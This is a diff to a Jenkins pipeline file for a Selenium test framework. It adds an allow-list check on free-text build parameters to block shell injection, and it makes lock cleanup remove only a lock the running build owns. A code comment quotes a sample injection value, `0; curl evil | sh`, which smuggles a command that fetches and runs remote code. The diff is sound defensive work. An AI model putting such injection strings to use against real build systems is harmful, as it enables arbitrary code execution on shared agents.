@@ -134,6 +134,34 @@ pipeline {
 
     stages {
 
+        stage('Validate Parameters') {
+            // RETRY_COUNT, SECURITY_FAIL_CVSS, REPORTPORTAL_ENDPOINT and REPORTPORTAL_PROJECT are
+            // free-text and are interpolated straight into `sh` command lines below, so anyone
+            // allowed to "Build with Parameters" could run arbitrary shell on the agent with a
+            // value like `0; curl evil | sh`. Allow-list the shapes they can legitimately take
+            // and fail before anything else (including the shared-box lock) runs.
+            steps {
+                script {
+                    def retry = (params.RETRY_COUNT ?: '0').toString().trim()
+                    if (!(retry ==~ /\d{1,2}/)) {
+                        error "RETRY_COUNT must be a whole number 0-99, got: '${retry}'"
+                    }
+                    def cvss = (params.SECURITY_FAIL_CVSS ?: '11').toString().trim()
+                    if (!(cvss ==~ /\d{1,2}(\.\d)?/)) {
+                        error "SECURITY_FAIL_CVSS must be a number like 7 or 7.5 (11 disables the gate), got: '${cvss}'"
+                    }
+                    def rpEndpoint = (params.REPORTPORTAL_ENDPOINT ?: '').toString().trim()
+                    if (rpEndpoint && !(rpEndpoint ==~ /https?:\/\/[A-Za-z0-9._:\/-]+/)) {
+                        error "REPORTPORTAL_ENDPOINT must be a plain http(s) URL (letters, digits, . _ : / -), got: '${rpEndpoint}'"
+                    }
+                    def rpProject = (params.REPORTPORTAL_PROJECT ?: '').toString().trim()
+                    if (rpProject && !(rpProject ==~ /[A-Za-z0-9._-]+/)) {
+                        error "REPORTPORTAL_PROJECT may only contain letters, digits, . _ -, got: '${rpProject}'"
+                    }
+                }
+            }
+        }
+
         stage('Acquire Shared-Box Lock') {
             // ROOT CAUSE (2026-08-05 build, diagnosed from console log): this
             // agent runs with more than one executor, and disableConcurrentBuilds()
@@ -1783,8 +1811,15 @@ pipeline {
                     // hard-killed agent) is never left waiting on this
                     // build's own reporting/archiving steps below. See
                     // "Acquire Shared-Box Lock" stage.
+                    // Only release a lock THIS build owns (the lock stage writes BUILD_TAG into
+                    // <lockdir>/build). A build that failed before acquiring it (parameter
+                    // validation, or timing out while queued) must not delete the lock of the
+                    // build that is actually running.
                     sh '''
-                        rm -rf /tmp/selenium-framework-pipeline.lockdir 2>/dev/null || true
+                        LOCK_DIR="/tmp/selenium-framework-pipeline.lockdir"
+                        if [ -d "$LOCK_DIR" ] && [ "$(cat "$LOCK_DIR/build" 2>/dev/null || true)" = "${BUILD_TAG:-unknown}" ]; then
+                            rm -rf "$LOCK_DIR" 2>/dev/null || true
+                        fi
                     '''
 
                     // ── JUnit results ───────────────────────────────
